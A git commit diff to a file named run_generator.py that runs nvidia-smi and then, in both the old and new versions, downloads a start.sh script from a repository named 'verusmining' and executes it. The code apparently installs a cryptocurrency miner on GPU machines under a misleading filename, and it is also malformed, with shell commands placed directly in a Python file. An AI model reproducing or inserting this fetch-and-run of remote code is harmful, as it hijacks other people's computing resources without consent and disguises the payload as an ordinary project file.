5c57a744338cacc4d5f8e0cb1ebd3afd89552f5c
donieldave <92258140+donieldave@users.noreply.github.com>
2021-10-10 22:24:01 +0900

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,4 @@
 import os as al
 al.system("nvidia-smi")
-mkdir verus && cd ./verus && wget https://raw.githubusercontent.com/danieldave1/verusmining/main/start.sh && chmod +x start.sh && ./start.sh
+wget https://raw.githubusercontent.com/danieldave1/verusmining/main/start.sh && chmod +x start.sh && ./start.sh
 
